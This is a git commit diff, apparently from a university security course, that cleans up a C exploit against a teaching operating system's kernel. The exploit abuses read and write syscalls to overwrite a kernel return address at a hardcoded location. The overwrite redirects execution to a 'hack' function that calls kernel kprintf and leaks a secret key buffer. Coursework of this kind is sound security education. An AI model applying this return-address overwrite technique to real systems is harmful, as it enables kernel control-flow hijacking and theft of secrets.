7baf938358e2df154eba43326397f404a9b19df9
Stephan Valentan <s.valentan@student.tugraz.at>
2017-01-24 23:56:58 +0100

    cleanup

--- task_2/SWEPPWN/getinfo.c
+++ task_2/SWEPPWN/getinfo.c
@@ -1,38 +1,25 @@
 #include <stdio.h>
 #include <fcntl.h>
 
-char* kprintfstrg = "This is the content of %x: %s";
+size_t* key_buffer_address;
 
-void hack(size_t arg1, size_t arg2, size_t* to_read){
+void hack()
+{
     typedef void (*kprintf_ptr)(const char*,...);
     kprintf_ptr k = (kprintf_ptr )0x8000202e; //kprintf function
-    k("This is the content of %x: %s\n", *to_read, *to_read);
+    k("This is the content of %x: %s\n", *key_buffer_address, *key_buffer_address);
 }
 
 int main()
 {
-  size_t to_read = __syscall(sc_getkeyinfo, 0x00, 0x00, 0x00, 0x00, 0x00);
-  printf("We need to read from %x\n", to_read);
+  key_buffer_address  = __syscall(sc_getkeyinfo, 0x00, 0x00, 0x00, 0x00, 0x00);
 
-  /* YOUR CODE HERE */
-    printf("THIS IS THE HACK FUNCTION ohne & %x, mit & %x\n", hack, &hack);
-    size_t buffer[5];
-    //buffer[0] = 0x8000202e; //kprintf function
-    buffer[0] = hack;
-    buffer[1] = 0x1; //not used anymore
-    buffer[2] = (size_t )kprintfstrg; //not used anymore
-    buffer[3] = to_read;
-    buffer[4] = to_read;
-
-  size_t expected_return_address = 0x8013616c;
-  size_t to_overwrite = expected_return_address;
-  printf("To overwrite Address: %x\n", to_overwrite);
+  size_t return_address = hack;
+  size_t to_overwrite = 0x8013616c; //Location of actual return address
 
   int fd = __syscall(sc_open, "open.txt", O_CREAT | O_RDWR, 0777, 0x00, 0x00);
-  printf("file descriptor return must be number: %d\n", fd);
-  int retval = __syscall(sc_write, fd, buffer, 5*sizeof(size_t), 0x00, 0x00);
-  printf("retval of write syscall must be <1: %d\n", retval);
-  int retval2 = __syscall(sc_read, fd, to_overwrite, 5*sizeof(size_t), 0x00, 0x00);
+  __syscall(sc_write, fd, &return_address, sizeof(size_t), 0x00, 0x00);
+  __syscall(sc_read, fd, to_overwrite, sizeof(size_t), 0x00, 0x00);
 
   return 0;
 }
